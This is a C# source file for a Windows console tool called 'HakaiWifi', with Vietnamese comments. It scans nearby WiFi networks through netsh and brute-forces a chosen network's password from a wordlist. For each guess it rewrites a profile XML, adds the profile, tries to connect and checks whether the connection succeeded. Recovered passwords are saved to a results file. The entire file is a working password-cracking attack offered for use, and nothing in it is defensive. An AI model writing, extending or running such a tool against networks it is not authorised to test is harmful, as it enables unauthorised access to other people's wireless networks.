using Spectre.Console;
using System.Diagnostics;

namespace HakaiWifi
{
    public static class HandleLogic
    {
        private static string DriverId = "Not Defined";
        private static string WifiTarget = "Not Defined";
        private static string WordlistFile = "Not Defined";

        public static bool MainMenu()
        {
            RenderStatusTable();

            Console.WriteLine();
            CustomUI.WriteLineColor("--------------------------", "green");
            var choice = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("[green]=========< MENU >=========[/]")
                    .PageSize(10)
                    .HighlightStyle(new Style(foreground: Color.Cyan, decoration: Decoration.Bold))
                    .AddChoices(new[] {
                        "1. Scan and attach driver",
                        "2. Target a wifi",
                        "3. Choose wordlist",
                        "4. Start Brute Force",
                        "5. Exit"
                    }));

            switch (choice)
            {
                case "1. Scan and attach driver":
                    ConfigDriver();
                    return true;

                case "2. Target a wifi":
                    ConfigTarget();
                    return true;

                case "3. Choose wordlist":
                    ConfigWordlist();
                    return true;
                case "4. Start Brute Force":
                    StartBF();
                    return true;
                case "5. Exit":
                    Console.Clear();
                    AnsiConsole.Write(new FigletText("Hakai Wifi Terminated!").Color(Color.Red));
                    return false;
                default: return true;
            }
        }


        // ---------- METHOD HANDLE LOGIC ----------
        private static void ConfigDriver()
        {
            AnsiConsole.Status()
                .Start("Detecting WiFi-Driver...", ctx =>
                {
                    Thread.Sleep(1000);
                });

            string output = RunProcess("netsh", "wlan show interfaces");
            var lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            var drivers = new List<string>();
            string currentName = "";

            // Trích xuất Name từ kết quả lệnh netsh[cite: 1]
            foreach (var line in lines)
            {
                if (line.Trim().StartsWith("Name"))
                {
                    currentName = line.Split(':')[1].Trim();
                    drivers.Add(currentName);
                }
            }

            if (drivers.Count == 0)
            {
                AnsiConsole.MarkupLine("[red]=> WiFi-Driver is set as null! No interfaces found.[/]");
                AnsiConsole.MarkupLine("Press any key to continue...");
                Console.ReadKey();
                return;
            }

            AnsiConsole.MarkupLine($"[green]=> Found {drivers.Count} WiFi-Driver(s)[/]");

            // Tự động chọn nếu chỉ có 1 driver[cite: 1]
            if (drivers.Count == 1)
            {
                DriverId = drivers[0];
                AnsiConsole.MarkupLine($"[green]> Auto selected [{DriverId}] as the default using![/]");
            }
            else
            {
                // Cho phép người dùng chọn nếu có nhiều driver[cite: 1]
                DriverId = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("[green]Select a WiFi-Driver to set as default using:[/]")
                        .AddChoices(drivers));
                AnsiConsole.MarkupLine($"[green]> Selected [{DriverId}] as the default using... (Done)[/]");
            }

            Console.WriteLine();
            AnsiConsole.MarkupLine("[green]Press any key to continue...[/]");
            Console.ReadKey();
            Console.Clear();
        }

        private static void ConfigTarget()
        {
            if (DriverId.Equals("Not Defined"))
            {
                AnsiConsole.MarkupLine("[red]You have to select a driver to perform a target.[/]");
                AnsiConsole.MarkupLine("[green]Press any key to continue...[/]");
                Console.ReadKey();
                Console.Clear();
                return;
            }

            AnsiConsole.MarkupLine("[green]Scanning Available Wi-Fi Networks...[/]");

            // Quét SSID dựa trên interface đã chọn[cite: 1]
            string output = RunProcess("netsh", $"wlan show networks mode=Bssid interface=\"{DriverId}\"");
            var lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            var targets = new List<string>();

            foreach (var line in lines)
            {
                if (line.Trim().StartsWith("SSID"))
                {
                    var parts = line.Split(':');
                    if (parts.Length > 1)
                    {
                        string ssid = parts[1].Trim();
                        if (!string.IsNullOrEmpty(ssid) && !targets.Contains(ssid))
                        {
                            targets.Add(ssid);
                        }
                    }
                }
            }

            targets.Add("Cancel");

            var selection = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("[green]Available Wi-Fi Networks[/]")
                    .PageSize(10)
                    .AddChoices(targets));

            if (selection != "Cancel")
            {
                WifiTarget = selection;
                AnsiConsole.MarkupLine($"[green]Target set to: {WifiTarget}[/]");
            }

            Console.Clear();
        }

        private static void ConfigWordlist()
        {
            Console.Clear();
            AnsiConsole.MarkupLine("[cyan]Wordlist Configuration[/]");

            string path = AnsiConsole.Ask<string>("[green]Please provide a valid wordlist path:[/]");

            // Xác thực xem tệp từ điển có tồn tại không[cite: 1]
            if (!File.Exists(path))
            {
                AnsiConsole.MarkupLine("[red]Provided path does not resolve to a file.[/]");
                Thread.Sleep(2000);
            }
            else
            {
                WordlistFile = path;
                AnsiConsole.MarkupLine("[green]Wordlist attached successfully![/]");
                Thread.Sleep(1000);
            }
            Console.Clear();
        }

        private static void StartBF()
        {
            // Kiểm tra điều kiện đầu vào[cite: 1]
            if (WordlistFile.Equals("Not Defined") || WifiTarget.Equals("Not Defined") || DriverId.Equals("Not Defined"))
            {
                AnsiConsole.MarkupLine("[red]Missing configurations (Driver, Target, or Wordlist). Please setup all before attacking.[/]");
                AnsiConsole.MarkupLine("Press any key to return...");
                Console.ReadKey();
                Console.Clear();
                return;
            }

            if (!File.Exists("importwifi.xml"))
            {
                AnsiConsole.MarkupLine("[red]importwifi.xml is missing. Please ensure the template file is in the root directory.[/]");
                Console.ReadKey();
                Console.Clear();
                return;
            }

            AnsiConsole.MarkupLine("[yellow]WARNING: This will delete existing profile for the target network.[/]");
            AnsiConsole.MarkupLine("Press any key to start attack...");
            Console.ReadKey();

            // Xoá profile cũ để tránh xung đột[cite: 1]
            RunProcess("netsh", $"wlan delete profile \"{WifiTarget}\" interface=\"{DriverId}\"");

            // Tạo XML ban đầu với SSID mục tiêu[cite: 1]
            string xmlTemplate = File.ReadAllText("importwifi.xml");
            string preparedXml = xmlTemplate.Replace("changethistitle", WifiTarget);

            string[] passwords = File.ReadAllLines(WordlistFile);
            int passwordCount = 0;
            bool found = false;
            string correctPassword = "";

            if (!Directory.Exists("History")) Directory.CreateDirectory("History");

            AnsiConsole.Status()
                .Spinner(Spinner.Known.BouncingBar)
                .SpinnerStyle(Style.Parse("red"))
                .Start($"[cyan]Attacking {WifiTarget}...[/]", ctx =>
                {
                    foreach (string pass in passwords)
                    {
                        passwordCount++;
                        ctx.Status($"[magenta]Trying password ({passwordCount}/{passwords.Length}):[/] [yellow]{pass}[/]");

                        // Gán mật khẩu vào XML và lưu lại[cite: 1]
                        string attemptXml = preparedXml.Replace("changethiskey", pass);
                        File.WriteAllText("importwifi_attempt.xml", attemptXml);

                        // Import và Connect[cite: 1]
                        RunProcess("netsh", "wlan add profile filename=\"importwifi_attempt.xml\"");
                        RunProcess("netsh", $"wlan connect name=\"{WifiTarget}\" interface=\"{DriverId}\"");

                        // Kiểm tra kết nối 8 lần, độ trễ 500ms mỗi vòng[cite: 1]
                        bool isConnected = false;
                        for (int i = 0; i < 8; i++)
                        {
                            Thread.Sleep(500);
                            string state = RunProcess("netsh", "wlan show interfaces");

                            // Nếu trạng thái hiển thị "connected"[cite: 1]
                            if (state.Contains("State") && state.Contains("connected"))
                            {
                                isConnected = true;
                                break;
                            }
                        }

                        File.AppendAllText($"History\\{WifiTarget}.txt", pass + Environment.NewLine);

                        // Dọn dẹp XML nháp sau khi kiểm tra[cite: 1]
                        if (File.Exists("importwifi_attempt.xml"))
                            File.Delete("importwifi_attempt.xml");

                        if (isConnected)
                        {
                            found = true;
                            correctPassword = pass;
                            break;
                        }
                    }
                });

            Console.Clear();
            if (found)
            {
                // In kết quả thành công[cite: 1]
                AnsiConsole.MarkupLine("[green]Found the password![/]");
                AnsiConsole.MarkupLine($"[bold cyan]Target     :[/] [white]{WifiTarget}[/]");
                AnsiConsole.MarkupLine($"[bold cyan]Password   :[/] [white]{correctPassword}[/]");
                AnsiConsole.MarkupLine($"[bold cyan]At attempt :[/] [white]{passwordCount}[/]");

                File.AppendAllText("result.txt", $"Target: {WifiTarget} | Password: {correctPassword} | Attempt: {passwordCount}\n");
            }
            else
            {
                // Xử lý thất bại[cite: 1]
                AnsiConsole.MarkupLine("[red]Could not find the password.[/]");
                RunProcess("netsh", $"wlan delete profile \"{WifiTarget}\" interface=\"{DriverId}\"");
            }

            if (File.Exists("importwifi_prepared.xml")) File.Delete("importwifi_prepared.xml");

            Console.WriteLine();
            AnsiConsole.MarkupLine("[green]Press any key to continue...[/]");
            Console.ReadKey();
            Console.Clear();
        }

        // ---------- HELPER METHODS ----------

        private static void RenderStatusTable()
        {
            AnsiConsole.WriteLine();
            var table = new Table().Border(TableBorder.Rounded).BorderColor(Color.Yellow);

            table.AddColumn(new TableColumn("[yellow]Property[/]").Centered());
            table.AddColumn(new TableColumn("[yellow]Value[/]").Centered());

            table.AddRow("[bold cyan]Interface[/]", FormatValue(DriverId));
            table.AddRow("[bold cyan]Target[/]", FormatValue(WifiTarget));
            table.AddRow("[bold cyan]Wordlist[/]", FormatValue(WordlistFile));

            AnsiConsole.Write(table);
        }
        private static string FormatValue(string value)
        {
            return value == "not_defined" ? "[grey]Not Defined[/]" : $"[white]{value}[/]";
        }

        /// <summary>
        /// Thực thi command-line ngầm và trả về output dưới dạng text.
        /// </summary>
        private static string RunProcess(string fileName, string arguments)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = System.Text.Encoding.UTF8
            };

            using (Process process = Process.Start(psi))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    return reader.ReadToEnd();
                }
            }
        }
    }
}
